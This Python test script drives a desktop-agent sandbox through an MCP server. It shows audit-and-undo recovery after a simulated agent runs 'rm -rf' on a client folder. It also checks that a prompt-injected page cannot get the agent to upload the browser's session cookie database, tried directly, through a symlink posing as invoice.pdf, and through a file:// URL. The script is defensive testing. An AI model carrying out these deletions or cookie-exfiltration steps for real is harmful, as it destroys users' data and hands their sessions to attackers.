"""End-to-end test of both hackathon pivots against a running Bot Station,
through the MCP server over stdio (the way an agent's client talks to it).

    demo/run.sh            (sets up the environment, then runs this)

Pivot A: an agent deletes a client's folder from the terminal. The audit
log must show the command, and scripts/undo.sh must bring the folder back
byte for byte.

Pivot B: a page carries a prompt injection asking the agent to upload the
saved session cookies, while the browser is logged in to a "bank". This
plays the worst case, an agent that obeys the page, and checks that the
snapshot warns about the injection, the file picker stays closed, the
cookie database is refused (also through a symlink), nothing reaches the
attacker, and the audit log flags it. A legitimate upload must still work.

Drives the real desktop: don't run it while someone is using it.
"""

from __future__ import annotations

import asyncio
import os
import subprocess
import sys
import time

from mcp import Client
from mcp.client.stdio import StdioServerParameters

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
COMPOSE = ["docker", "compose", "-f", f"{ROOT}/compose.yaml", "-f", f"{ROOT}/demo/compose.demo.yaml"]
COOKIES = "/home/browser/.config/net.imput.helium/Default/Cookies"
CLIENT = "/root/Documents/client-acme"
failures = 0


def sh(*args: str, check: bool = True) -> str:
    r = subprocess.run(args, capture_output=True, text=True, cwd=ROOT)
    if check and r.returncode != 0:
        raise SystemExit(f"{' '.join(args)} failed:\n{r.stdout}{r.stderr}")
    return r.stdout + r.stderr


def computer(cmd: str) -> str:
    return sh(*COMPOSE, "exec", "-T", "computer", "bash", "-c", cmd)


def check(ok: bool, what: str, detail: str = "") -> None:
    global failures
    print(f"  {'PASS' if ok else 'FAIL'}  {what}")
    if not ok:
        failures += 1
        if detail:
            print("        " + detail[:800].replace("\n", "\n        "))


def text(res) -> str:
    return "\n".join(c.text for c in res.content if c.type == "text")


async def main() -> None:
    params = StdioServerParameters(command=sys.executable, args=["-m", "bot_station_mcp.server"], env=dict(os.environ))
    async with Client(params) as mcp:

        async def tool(name: str, **args) -> tuple[str, bool]:
            res = await mcp.call_tool(name, args)
            return text(res), res.is_error

        status, _ = await tool("computer_status")
        check("Audit log and undo on" in status, "computer reports audit + undo on", status)

        # ---------------- Pivot A ----------------
        print("\nPivot A: an agent deletes a client's folder; undo it and show what happened")
        computer(
            f"rm -rf {CLIENT} && mkdir -p {CLIENT}/contracts && "
            f"echo 'ACME master services agreement, signed 2026-09-01' > {CLIENT}/contracts/msa.txt && "
            f"head -c 200000 /dev/urandom > {CLIENT}/designs.bin && echo 'call Bob on Friday' > {CLIENT}/notes.md"
        )
        before = computer(f"cd {CLIENT} && find . -type f | sort | xargs sha256sum")
        snap = sh(f"{ROOT}/scripts/undo.sh", "snapshot", "test: client folder created").split()[0]
        print(f"  (undo point {snap})")

        # The "agent" opens the terminal and wipes the folder
        await tool("launch_app", app="terminal", path="/root/Documents", observe="none")
        await tool("wait_for_screen", until="stable")
        await tool("type_text", text=f"rm -rf {CLIENT}\n", observe="none")
        await asyncio.sleep(1.5)
        gone = computer(f"test -e {CLIENT} && echo still-there || echo gone").strip()
        check(gone == "gone", "the agent's rm -rf deleted the folder", gone)
        await tool("press_keys", keys="ctrl+shift+q", observe="none")  # close the terminal

        log = sh(f"{ROOT}/scripts/undo.sh", "log", "-n", "20")
        check(f"rm -rf {CLIENT}" in log, "audit log shows the exact command the agent typed", log)
        check("launch" in log and "terminal" in log, "audit log shows the agent opened the terminal", log)

        diff = sh(f"{ROOT}/scripts/undo.sh", "diff", snap, "Documents/client-acme")
        check("bring back" in diff and "msa.txt" in diff, "diff lists the deleted files", diff)

        t0 = time.perf_counter()
        out = sh(*COMPOSE, "exec", "-T", "-e", "YES=1", "keeper", "keeper", "restore", snap, "Documents/client-acme")
        secs = time.perf_counter() - t0
        after = computer(f"cd {CLIENT} && find . -type f | sort | xargs sha256sum")
        check(after == before, f"folder restored byte for byte in {secs:.2f} s (incl. docker exec)", out + after)
        log = sh(f"{ROOT}/scripts/undo.sh", "log", "-n", "5")
        check("RESTORE /root/Documents/client-acme" in log, "the restore itself is in the audit log", log)

        # ---------------- Pivot B ----------------
        print("\nPivot B: a page tells the agent to upload the saved session cookies")
        sh(*COMPOSE, "exec", "-T", "demo", "sh", "-c", "rm -rf /tmp/received")
        computer("echo 'Q3 numbers: fine' > /root/Documents/report.txt && chmod a+r /root/Documents/report.txt")
        await tool("browser_navigate", url="http://bank.test:8000/login", observe="none")
        await tool("browser_navigate", url="http://bank.test:8000/account", observe="none")
        acct, _ = await tool("browser_snapshot", text_chars=500)
        check("balance" in acct, "browser is logged in to the bank (session cookie set)", acct)
        has_db = computer(f"test -s {COOKIES} && echo yes || echo no").strip()
        check(has_db == "yes", "the cookie database exists on disk", has_db)

        page, _ = await tool("browser_navigate", url="http://evil.test:8000/", observe="none")
        page, _ = await tool("browser_snapshot", text_chars=3000)
        check("<page-content id=" in page and "</page-content id=" in page, "page content is fenced as untrusted", page)
        check("WARNING: this page contains text aimed at AI agents" in page, "snapshot warns about the injection", page)

        # Worst case: the agent obeys. Click the file field...
        ref = next(int(l[1 : l.index("]")]) for l in page.splitlines() if l.startswith("[") and "Attach" in l)
        page, _ = await tool("browser_click", ref=ref)
        check("The page asked for a file" in page, "the page's file request is reported to the agent", page)
        wins, _ = await tool("list_windows")
        check(not any(w in wins for w in ("Open File", "File Upload", "Choose File")), "no native file picker opened", wins)

        # ...and tries to hand over the cookie database, directly and disguised
        out, err = await tool("browser_upload", paths=[COOKIES])
        check(err and "outside the folders" in out, "uploading the cookie database is refused", out)
        computer(f"ln -sf {COOKIES} /root/Downloads/invoice.pdf")
        out, err = await tool("browser_upload", paths=["/root/Downloads/invoice.pdf"])
        check(err and "outside the folders" in out, "a symlink to it under /root is refused too", out)
        computer("rm -f /root/Downloads/invoice.pdf")
        # The navigate API takes http(s) only; through the address bar, the policy blocks it
        await tool("press_keys", keys="ctrl+l", observe="none")
        await tool("type_text", text="file:///home/browser/.config/net.imput.helium/Default/\n", observe="none")
        await tool("browser_wait", until="load", timeout_ms=5000)
        out, _ = await tool("browser_snapshot", text_chars=500)
        check("blocked" in out.lower() and "Cookies" not in out, "the browser won't open its profile folder as a page", out)

        await tool("browser_navigate", url="http://evil.test:8000/", observe="none")
        page, _ = await tool("browser_snapshot")
        submit = next(int(l[1 : l.index("]")]) for l in page.splitlines() if l.startswith("[") and "Submit" in l)
        await tool("browser_click", ref=submit, observe="none")
        await asyncio.sleep(1)
        logs = sh(*COMPOSE, "logs", "--no-log-prefix", "demo")
        check("sqlite=True" not in logs, "the attacker received no cookie database", logs[-600:])

        audit = sh(f"{ROOT}/scripts/undo.sh", "log", "-n", "40")
        check("ALERT" in audit and "prompt injection" in audit, "audit log flags the injection the agent saw", audit)
        check("browser profile" in audit and "browser/upload" in audit, "audit log flags the upload attempts", audit)

        # A legitimate upload still works
        await tool("browser_navigate", url="http://evil.test:8000/", observe="none")
        page, _ = await tool("browser_snapshot")
        ref = next(int(l[1 : l.index("]")]) for l in page.splitlines() if l.startswith("[") and "Attach" in l)
        await tool("browser_click", ref=ref, observe="none")
        out, err = await tool("browser_upload", paths=["/root/Documents/report.txt"], observe="snapshot")
        check(not err, "a file under /root can be uploaded", out)
        submit = next(int(l[1 : l.index("]")]) for l in out.splitlines() if l.startswith("[") and "Submit" in l)
        await tool("browser_click", ref=submit, observe="none")
        await asyncio.sleep(1)
        logs = sh(*COMPOSE, "logs", "--no-log-prefix", "demo")
        check("report.txt" in logs, "the site received report.txt", logs[-600:])

    print(f"\n{'all good' if not failures else f'{failures} failure(s)'}")
    sys.exit(1 if failures else 0)


asyncio.run(main())
